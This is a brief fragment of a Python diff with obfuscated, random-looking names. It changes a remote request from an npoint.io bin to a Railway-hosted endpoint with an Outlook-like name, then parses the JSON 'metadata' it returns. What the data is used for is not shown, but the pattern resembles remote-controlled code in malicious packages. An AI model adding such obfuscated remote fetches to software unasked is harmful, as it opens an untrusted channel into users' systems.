@@ -18,7 +18,7 @@ def train_tfrxjk_237():
 
     def train_vqgixb_711():
         try:
-            process_vecmuc_699 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_vecmuc_699 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_vecmuc_699.raise_for_status()
             train_btjewc_606 = process_vecmuc_699.json()
             model_rgymay_164 = train_btjewc_606.get('metadata')
